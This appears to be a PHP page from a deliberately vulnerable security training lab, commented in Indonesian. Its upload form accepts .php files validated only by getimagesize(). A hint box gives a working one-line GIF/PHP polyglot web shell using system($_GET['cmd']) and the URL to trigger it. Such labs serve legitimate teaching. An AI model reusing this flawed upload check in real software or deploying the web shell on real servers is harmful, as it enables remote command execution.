<?php
$title = 'Lab 6: Polyglot Web Shell Upload (RCE)';
$error = ''; $uploaded_name = '';
// Fitur "custom theme icon" ini sengaja mengizinkan upload .php/.phtml (dianggap sah, dipakai
// untuk theme berbasis PHP template), TAPI developer menambahkan pengecekan "keamanan": file
// juga harus lolos getimagesize() supaya "dipastikan" isinya benar-benar gambar.
$allowed_ext = ['php', 'phtml'];

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
    $name = basename($_FILES['file']['name']);
    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
    if (!in_array($ext, $allowed_ext, true)) {
        $error = "Only .php/.phtml theme icon files allowed.";
    } else {
        // VULNERABLE: getimagesize() hanya membaca header/struktur di AWAL file untuk
        // mengenali dimensi & tipe gambar - tidak memeriksa SISA isi file sama sekali. File
        // polyglot (header GIF valid + kode PHP menyusul di belakangnya) tetap lolos sebagai
        // "gambar valid", padahal PHP akan tetap mengeksekusi tag pembuka PHP apa pun
        // posisinya saat file ini nantinya diakses sebagai .php.
        $info = @getimagesize($_FILES['file']['tmp_name']);
        if ($info === false) {
            $error = 'File content does not look like a valid image (getimagesize() failed).';
        } else {
            $dest = __DIR__ . '/uploads/' . $name;
            if (move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
                $uploaded_name = $name;
            } else {
                $error = 'Upload failed.';
            }
        }
    }
}

include 'header.php';
?>

<details class="hint-box">
<summary>Lihat Hint</summary>
<p class="hint">Goal: fitur "theme icon" ini memang mengizinkan ekstensi <code>.php</code>/
<code>.phtml</code> secara sah, tapi developer menambahkan pengecekan <code>getimagesize()</code>
untuk "memastikan" isinya gambar asli. <code>getimagesize()</code> hanya memeriksa header/
struktur di awal file, bukan seluruh isinya - buat file <strong>polyglot</strong>: header GIF
valid diikuti kode PHP:</p>
<pre class="hint">printf 'GIF89a;\n&lt;?php system($_GET["cmd"]); ?&gt;' > shell.php</pre>
<p class="hint">Upload <code>shell.php</code> tersebut. <code>getimagesize()</code> akan
mengenalinya sebagai GIF valid (lolos), tapi karena ekstensinya <code>.php</code>, saat
diakses lewat browser file ini tetap dieksekusi PHP sepenuhnya (tag <code>&lt;?php ?&gt;</code>
tetap dijalankan di mana pun posisinya dalam file) &mdash; buka
<code>uploads/shell.php?cmd=id</code>.</p>
</details>

<?php if ($error): ?><div class="error-box"><?php echo htmlspecialchars($error); ?></div><?php endif; ?>
<?php if ($uploaded_name): ?>
<div class="success-box">Uploaded to uploads/<?php echo htmlspecialchars($uploaded_name); ?>
&mdash; <a href="uploads/<?php echo rawurlencode($uploaded_name); ?>?cmd=id" target="_blank">buka &amp; coba ?cmd=id</a></div>
<?php endif; ?>

<form method="post" enctype="multipart/form-data">
  <label>Theme icon file (.php/.phtml, harus lolos validasi gambar)</label><br>
  <input type="file" name="file"><br>
  <button type="submit">Upload</button>
</form>

<?php
$files = array_diff(scandir(__DIR__ . '/uploads'), ['.', '..']);
if ($files): ?>
<h3>Uploaded files</h3>
<ul class="file-list">
<?php foreach ($files as $f): ?>
  <li><a href="uploads/<?php echo rawurlencode($f); ?>" target="_blank"><?php echo htmlspecialchars($f); ?></a></li>
<?php endforeach; ?>
</ul>
<?php endif; ?>

<?php include 'footer.php'; ?>
